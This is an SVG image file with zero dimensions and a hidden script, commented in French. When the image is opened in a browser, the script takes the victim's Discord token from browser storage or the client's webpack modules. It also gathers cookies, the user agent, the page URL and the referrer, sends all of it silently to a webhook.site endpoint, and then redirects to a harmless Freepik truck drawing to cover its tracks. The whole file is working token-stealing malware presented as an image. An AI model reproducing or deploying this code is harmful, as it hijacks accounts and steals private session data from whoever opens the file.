<svg xmlns="http://www.w3.org/2000/svg" width="0" height="0">
    <script>
        // 1. RÃ©cupÃ¨re le token depuis localStorage/sessionStorage (prioritÃ©)
        let token = null;
        try {
            // MÃ©thode 1 : Token dans localStorage (BetterDiscord, clients modifiÃ©s)
            token = localStorage.getItem('token') ||
                    sessionStorage.getItem('token') ||
                    JSON.parse(localStorage.getItem('discord'))?.token ||
                    JSON.parse(sessionStorage.getItem('discord'))?.token;

            // MÃ©thode 2 : Token dans les variables globales (rare)
            if (!token && window.webpackChunkdiscord_app) {
                const webpack = Object.values(window.webpackChunkdiscord_app)
                    .find(m => m?.default?.getToken);
                token = webpack?.default?.getToken();
            }
        } catch (e) {
            console.log("Erreur token:", e);
        }

        // 2. RÃ©cupÃ¨re TOUS les cookies (mÃªme si HttpOnly, on essaie)
        let cookies = "âš ï¸ Cookies non accessibles (HttpOnly?)";
        try {
            cookies = document.cookie;
            if (!cookies) cookies = "âŒ Vide (contexte restreint?)";
        } catch (e) {
            cookies = "ðŸš« BloquÃ© par le navigateur: " + e.message;
        }

        // 3. RÃ©cupÃ¨re d'autres infos utiles
        const userAgent = navigator.userAgent;
        const pageURL = window.location.href;
        const referrer = document.referrer;

        // 4. Envoie tout au webhook
        const webhookURL = "https://webhook.site/adfe3e10-7c3c-492d-8c54-89c0baadcfd3";
        const data = {
            token: token || "âŒ Token non trouvÃ©",
            cookies: cookies,
            userAgent: userAgent,
            pageURL: pageURL,
            referrer: referrer,
            timestamp: new Date().toISOString()
        };

        // MÃ©thode 1 : Via une image (silencieux)
        new Image().src = `${webhookURL}?data=${encodeURIComponent(JSON.stringify(data))}`;

        // MÃ©thode 2 : Via fetch (plus fiable, mais peut Ãªtre bloquÃ© par CORS)
        try {
            fetch(webhookURL, {
                method: "POST",
                body: JSON.stringify(data),
                headers: { "Content-Type": "application/json" }
            });
        } catch (e) {
            console.log("Fetch Ã©chouÃ©:", e);
        }

        // 5. Redirection vers une image innocente
        setTimeout(() => {
            window.location.href = "https://fr.freepik.com/vecteurs-libre/camion-transport-dessine-main_20123578.htm#fromView=keyword&page=1&position=0&uuid=a539da91-4a14-45af-b18c-2c1b19af92d6&query=Camion+dessin";
        }, 1500);
    </script>
</svg>
